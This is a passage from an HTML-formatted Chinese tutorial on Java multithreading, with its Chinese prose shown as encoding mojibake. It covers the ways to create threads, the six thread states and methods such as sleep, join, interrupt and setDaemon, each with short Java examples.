</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ç®€å•ç›´æ¥ï¼Œé€‚åˆç®€å•çš„çº¿ç¨‹ä»»åŠ¡</li>
<li>Javaæ˜¯å•ç»§æ‰¿ï¼Œç»§æ‰¿Threadåæ— æ³•ç»§æ‰¿å…¶ä»–ç±»</li>
<li>ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè€¦åˆåº¦é«˜</li>
</ul>
<h4 data-id="heading-8">æ–¹å¼äºŒï¼šå®ç°Runnableæ¥å£ï¼ˆæ¨èï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ: "</span> + Thread.currentThread().getName());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyRunnable</span>());
        thread.start();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°æ¥å£ï¼Œå¯ä»¥ç»§æ‰¿å…¶ä»–ç±»ï¼Œæ›´çµæ´»</li>
<li>ç¬¦åˆé¢å‘æ¥å£ç¼–ç¨‹çš„åŸåˆ™</li>
<li>ä»»åŠ¡å’Œçº¿ç¨‹åˆ†ç¦»ï¼Œè€¦åˆåº¦ä½</li>
<li><strong>æ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-9">æ–¹å¼ä¸‰ï¼šå®ç°Callableæ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Callable;
<span class="hljs-keyword">import</span> java.util.concurrent.FutureTask;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Callable</span>&lt;String&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        Thread.sleep(<span class="hljs-number">1000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå®Œæˆ: "</span> + Thread.currentThread().getName();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        FutureTask&lt;String&gt; futureTask = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FutureTask</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyCallable</span>());
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(futureTask);
        thread.start();
        
        <span class="hljs-comment">// è·å–è¿”å›å€¼</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> futureTask.get();
        System.out.println(result);
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¯ä»¥æœ‰è¿”å›å€¼</li>
<li>å¯ä»¥æŠ›å‡ºå¼‚å¸¸</li>
<li>éœ€è¦é…åˆFutureTaskä½¿ç”¨</li>
<li>é€‚åˆéœ€è¦è¿”å›ç»“æœçš„å¼‚æ­¥ä»»åŠ¡</li>
</ul>
<h4 data-id="heading-10">æ–¹å¼å››ï¼šä½¿ç”¨çº¿ç¨‹æ± åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.ExecutorService;
<span class="hljs-keyword">import</span> java.util.concurrent.Executors;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
        
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± æ‰§è¡Œä»»åŠ¡: "</span> + Thread.currentThread().getName());
        });
        
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹å¤ç”¨ï¼Œæ€§èƒ½æ›´å¥½</li>
<li>ç»Ÿä¸€ç®¡ç†çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸ</li>
<li>æ§åˆ¶å¹¶å‘æ•°é‡</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒæ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-11">æ–¹å¼äº”ï¼šLambdaè¡¨è¾¾å¼åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LambdaThread</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨Runnableçš„Lambdaè¡¨è¾¾å¼</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            System.out.println(<span class="hljs-string">"Lambdaçº¿ç¨‹: "</span> + Thread.currentThread().getName());
        });
        thread1.start();
        
        <span class="hljs-comment">// æ–¹å¼2ï¼šç›´æ¥ä½¿ç”¨çº¿ç¨‹æ± </span>
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newCachedThreadPool();
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± Lambda: "</span> + Thread.currentThread().getName());
        });
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä»£ç ç®€æ´</li>
<li>é€‚åˆç®€å•çš„ä»»åŠ¡</li>
<li>Java 8+æ”¯æŒ</li>
</ul>
<h3 data-id="heading-12">1.3 çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</h3>
<p>Javaçº¿ç¨‹æœ‰6ç§çŠ¶æ€ï¼Œå®šä¹‰åœ¨<code>Thread.State</code>æšä¸¾ä¸­ï¼š</p>
<h4 data-id="heading-13">NEWï¼ˆæ–°å»ºï¼‰</h4>
<p>çº¿ç¨‹è¢«åˆ›å»ºä½†å°šæœªå¯åŠ¨çš„çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
System.out.println(thread.getState()); <span class="hljs-comment">// NEW</span>
</code></pre>
<h4 data-id="heading-14">RUNNABLEï¼ˆå¯è¿è¡Œï¼‰</h4>
<p>çº¿ç¨‹æ­£åœ¨JVMä¸­æ‰§è¡Œï¼Œä½†å¯èƒ½æ­£åœ¨ç­‰å¾…æ“ä½œç³»ç»Ÿåˆ†é…CPUæ—¶é—´ç‰‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// è¿è¡Œä¸­æˆ–ç­‰å¾…CPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
System.out.println(thread.getState()); <span class="hljs-comment">// RUNNABLE</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> RUNNABLEçŠ¶æ€åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>Running</strong>ï¼šæ­£åœ¨æ‰§è¡Œ</li>
<li><strong>Ready</strong>ï¼šå°±ç»ªï¼Œç­‰å¾…CPUè°ƒåº¦</li>
</ul>
<h4 data-id="heading-15">BLOCKEDï¼ˆé˜»å¡ï¼‰</h4>
<p>çº¿ç¨‹è¢«é˜»å¡ï¼Œç­‰å¾…è·å–ç›‘è§†å™¨é”ï¼ˆmonitor lockï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// æŒæœ‰é”5ç§’</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-comment">// ç­‰å¾…thread1é‡Šæ”¾é”</span>
            }
        });
        
        thread1.start();
        Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç¡®ä¿thread1å…ˆè·å–é”</span>
        thread2.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        
        System.out.println(thread2.getState()); <span class="hljs-comment">// BLOCKED</span>
    }
}
</code></pre>
<h4 data-id="heading-16">WAITINGï¼ˆç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹æ— é™æœŸç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç‰¹å®šæ“ä½œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WaitingExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    lock.wait(); <span class="hljs-comment">// è¿›å…¥WAITINGçŠ¶æ€</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// WAITING</span>
    }
}
</code></pre>
<p><strong>è¿›å…¥WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Object.wait()</code> - ç­‰å¾…è¢«notify/notifyAllå”¤é†’</li>
<li><code>Thread.join()</code> - ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆ</li>
<li><code>LockSupport.park()</code> - ç­‰å¾…è¢«unparkå”¤é†’</li>
</ul>
<h4 data-id="heading-17">TIMED_WAITINGï¼ˆè¶…æ—¶ç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹åœ¨æŒ‡å®šæ—¶é—´å†…ç­‰å¾…ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimedWaitingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// è¿›å…¥TIMED_WAITINGçŠ¶æ€</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// TIMED_WAITING</span>
    }
}
</code></pre>
<p><strong>è¿›å…¥TIMED_WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Thread.sleep(long millis)</code></li>
<li><code>Object.wait(long timeout)</code></li>
<li><code>Thread.join(long millis)</code></li>
<li><code>LockSupport.parkNanos()</code></li>
<li><code>LockSupport.parkUntil()</code></li>
</ul>
<h4 data-id="heading-18">TERMINATEDï¼ˆç»ˆæ­¢ï¼‰</h4>
<p>çº¿ç¨‹æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸ç»ˆæ­¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"æ‰§è¡Œå®Œæˆ"</span>);
});
thread.start();
thread.join(); <span class="hljs-comment">// ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ</span>
System.out.println(thread.getState()); <span class="hljs-comment">// TERMINATED</span>
</code></pre>
<h4 data-id="heading-19">çŠ¶æ€è½¬æ¢å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">    NEW
     |
     | <span class="hljs-built_in">start</span>()
     â†“
RUNNABLE â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     |               |
     | wait()        | <span class="hljs-built_in">notify</span>()/<span class="hljs-built_in">notifyAll</span>()
     â†“               |
  WAITING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     |
     | <span class="hljs-built_in">sleep</span>(timeout)/wait(timeout)/<span class="hljs-built_in">join</span>(timeout)
     â†“
TIMED_WAITING
     |
     | è·å–é”å¤±è´¥
     â†“
  BLOCKED
     |
     | è·å–åˆ°é”
     â†“
RUNNABLE
     |
     | <span class="hljs-built_in">run</span>()æ–¹æ³•æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸
     â†“
 TERMINATED
</code></pre>
<h3 data-id="heading-20">1.4 çº¿ç¨‹çš„åŸºæœ¬æ“ä½œ</h3>
<h4 data-id="heading-21">start()æ–¹æ³•</h4>
<p>å¯åŠ¨çº¿ç¨‹ï¼Œä½¿çº¿ç¨‹è¿›å…¥RUNNABLEçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ"</span>);
});
thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
<span class="hljs-comment">// thread.start(); // é”™è¯¯ï¼ä¸èƒ½é‡å¤è°ƒç”¨start()</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>start()</code>åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œé‡å¤è°ƒç”¨ä¼šæŠ›å‡º<code>IllegalThreadStateException</code></li>
<li><code>start()</code>ä¼šåˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œè€Œ<code>run()</code>åªæ˜¯æ™®é€šæ–¹æ³•è°ƒç”¨</li>
</ul>
<h4 data-id="heading-22">run()æ–¹æ³•</h4>
<p>çº¿ç¨‹çš„æ‰§è¡Œä½“ï¼ŒåŒ…å«çº¿ç¨‹è¦æ‰§è¡Œçš„ä»£ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"runæ–¹æ³•æ‰§è¡Œ"</span>);
});
thread.run(); <span class="hljs-comment">// ç›´æ¥è°ƒç”¨run()ï¼Œä¸ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œåœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œ</span>
thread.start(); <span class="hljs-comment">// è°ƒç”¨start()ï¼Œåˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œrun()æ–¹æ³•</span>
</code></pre>
<p><strong>start() vs run()ï¼š</strong></p>
<ul>
<li><code>start()</code>ï¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œå¼‚æ­¥æ‰§è¡Œ</li>
<li><code>run()</code>ï¼šæ™®é€šæ–¹æ³•è°ƒç”¨ï¼ŒåŒæ­¥æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-23">sleep()æ–¹æ³•</h4>
<p>è®©å½“å‰çº¿ç¨‹ä¼‘çœ æŒ‡å®šæ—¶é—´ï¼Œè¿›å…¥TIMED_WAITINGçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// ä¼‘çœ 1ç§’</span>
    System.out.println(<span class="hljs-string">"ä¼‘çœ ç»“æŸ"</span>);
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    e.printStackTrace();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸é‡Šæ”¾é”</li>
<li>å¯èƒ½æŠ›å‡º<code>InterruptedException</code></li>
<li>æ—¶é—´åˆ°äº†è‡ªåŠ¨å”¤é†’</li>
</ul>
<h4 data-id="heading-24">yield()æ–¹æ³•</h4>
<p>æç¤ºè°ƒåº¦å™¨å½“å‰çº¿ç¨‹æ„¿æ„è®©å‡ºCPUæ—¶é—´ç‰‡ï¼Œä½†è°ƒåº¦å™¨å¯ä»¥å¿½ç•¥è¿™ä¸ªæç¤ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">": "</span> + i);
        Thread.<span class="hljs-keyword">yield</span>(); <span class="hljs-comment">// è®©å‡ºCPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>yield()</code>åªæ˜¯æç¤ºï¼Œä¸ä¿è¯ä¸€å®šä¼šè®©å‡ºCPU</li>
<li>é€‚åˆç”¨äºè°ƒè¯•å’Œæµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒä¸å¸¸ç”¨</li>
</ul>
<h4 data-id="heading-25">join()æ–¹æ³•</h4>
<p>ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">2000</span>);
        System.out.println(<span class="hljs-string">"thread1æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        thread1.join(); <span class="hljs-comment">// ç­‰å¾…thread1æ‰§è¡Œå®Œæˆ</span>
        System.out.println(<span class="hljs-string">"thread2æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

thread1.start();
thread2.start();
</code></pre>
<p><strong>é‡è½½æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>join()</code> - æ— é™æœŸç­‰å¾…</li>
<li><code>join(long millis)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´</li>
<li><code>join(long millis, int nanos)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆçº³ç§’ç²¾åº¦ï¼‰</li>
</ul>
<h4 data-id="heading-26">interrupt()æ–¹æ³•</h4>
<p>ä¸­æ–­çº¿ç¨‹ï¼Œè®¾ç½®çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
        System.out.println(<span class="hljs-string">"è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// æ•è·å¼‚å¸¸åï¼Œä¸­æ–­æ ‡å¿—ä½è¢«æ¸…é™¤</span>
            System.out.println(<span class="hljs-string">"çº¿ç¨‹è¢«ä¸­æ–­"</span>);
            Thread.currentThread().interrupt(); <span class="hljs-comment">// é‡æ–°è®¾ç½®ä¸­æ–­æ ‡å¿—</span>
            <span class="hljs-keyword">break</span>;
        }
    }
});

thread.start();
Thread.sleep(<span class="hljs-number">3000</span>);
thread.interrupt(); <span class="hljs-comment">// ä¸­æ–­çº¿ç¨‹</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>interrupt()</code>åªæ˜¯è®¾ç½®ä¸­æ–­æ ‡å¿—ä½ï¼Œä¸ä¼šå¼ºåˆ¶åœæ­¢çº¿ç¨‹</li>
<li>çº¿ç¨‹éœ€è¦æ£€æŸ¥ä¸­æ–­æ ‡å¿—ä½å¹¶è‡ªè¡Œé€€å‡º</li>
<li>å¦‚æœçº¿ç¨‹åœ¨é˜»å¡çŠ¶æ€ï¼ˆsleepã€waitç­‰ï¼‰ï¼Œä¼šæŠ›å‡º<code>InterruptedException</code></li>
</ul>
<h4 data-id="heading-27">isInterrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¸ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
thread.start();
thread.interrupt();
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// true</span>
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// trueï¼ˆæ ‡å¿—ä½è¿˜åœ¨ï¼‰</span>
</code></pre>
<h4 data-id="heading-28">interrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥å½“å‰çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java">Thread.currentThread().interrupt();
System.out.println(Thread.interrupted()); <span class="hljs-comment">// true</span>
System.out.println(Thread.interrupted()); <span class="hljs-comment">// falseï¼ˆæ ‡å¿—ä½è¢«æ¸…é™¤ï¼‰</span>
</code></pre>
<h4 data-id="heading-29">setDaemon()å®ˆæŠ¤çº¿ç¨‹</h4>
<p>è®¾ç½®çº¿ç¨‹ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå½“æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹ç»“æŸæ—¶ï¼ŒJVMä¼šè‡ªåŠ¨é€€å‡ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">daemonThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        System.out.println(<span class="hljs-string">"å®ˆæŠ¤çº¿ç¨‹è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
});

daemonThread.setDaemon(<span class="hljs-literal">true</span>); <span class="hljs-comment">// è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹</span>
daemonThread.start();

Thread.sleep(<span class="hljs-number">3000</span>);
System.out.println(<span class="hljs-string">"ä¸»çº¿ç¨‹ç»“æŸï¼ŒJVMé€€å‡º"</span>);
<span class="hljs-comment">// å®ˆæŠ¤çº¿ç¨‹ä¹Ÿä¼šéšä¹‹ç»“æŸ</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ˆæŠ¤çº¿ç¨‹ä¸èƒ½ç‹¬ç«‹å­˜åœ¨ï¼Œå¿…é¡»ä¾èµ–éå®ˆæŠ¤çº¿ç¨‹</li>
<li>é€‚åˆæ‰§è¡Œåå°ä»»åŠ¡ï¼Œå¦‚åƒåœ¾å›æ”¶ã€ç›‘æ§ç­‰</li>
<li>å¿…é¡»åœ¨<code>start()</code>ä¹‹å‰è®¾ç½®</li>
</ul>
<h4 data-id="heading-30">setPriority()çº¿ç¨‹ä¼˜å…ˆçº§</h4>
<p>è®¾ç½®çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼ˆ1-10ï¼‰ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"é«˜ä¼˜å…ˆçº§: "</span> + i);
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"ä½ä¼˜å…ˆçº§: "</span> + i);
    }
});

thread1.setPriority(Thread.MAX_PRIORITY); <span class="hljs-comment">// 10</span>
thread2.setPriority(Thread.MIN_PRIORITY);  <span class="hljs-comment">// 1</span>

thread1.start();
thread2.start();
</code></pre>
<p><strong>ä¼˜å…ˆçº§å¸¸é‡ï¼š</strong></p>
<ul>
<li><code>Thread.MIN_PRIORITY = 1</code></li>
<li><code>Thread.NORM_PRIORITY = 5</code>ï¼ˆé»˜è®¤ï¼‰</li>
<li><code>Thread.MAX_PRIORITY = 10</code></li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
